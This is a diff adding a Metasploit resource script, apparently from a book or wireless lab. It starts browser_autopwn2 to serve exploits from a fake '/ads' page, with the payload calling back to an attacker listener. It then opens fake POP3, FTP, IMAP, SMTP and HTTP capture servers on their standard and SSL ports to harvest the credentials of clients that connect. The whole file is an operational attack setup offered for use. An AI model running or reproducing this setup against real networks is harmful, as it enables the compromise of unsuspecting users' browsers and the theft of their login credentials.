@@ -1,0 +1,70 @@
+db_connect postgres:toor@127.0.0.1/msfbook
+
+use auxiliary/server/browser_autopwn2
+
+setg AUTOPWN_HOST 192.168.35.135
+setg AUTOPWN_PORT 4444
+setg AUTOPWN_URI /ads
+
+set LHOST 192.168.37.254
+set LPORT 45000
+setg SRVHOST 192.168.37.254
+set SRVPORT 81
+set URIPATH /ads
+
+set HTMLContent file://root/myTools/wireless/index.html
+
+run
+
+use auxiliary/server/capture/pop3
+set SRVPORT 110
+set SSL false
+run
+
+use auxiliary/server/capture/pop3
+set SRVPORT 995
+set SSL true
+run
+
+use auxiliary/server/capture/ftp
+run
+
+use auxiliary/server/capture/imap
+set SSL false
+set SRVPORT 143
+run
+
+use auxiliary/server/capture/imap
+set SSL true
+set SRVPORT 993
+run
+
+use auxiliary/server/capture/smtp
+set SSL false
+set SRVPORT 25
+run
+
+use auxiliary/server/capture/smtp
+set SSL true
+set SRVPORT 465
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 82
+set SSL false
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 8080
+set SSL false
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 443
+set SSL true
+run
+
+use auxiliary/server/capture/http
+set SRVPORT 8443
+set SSL true
+run
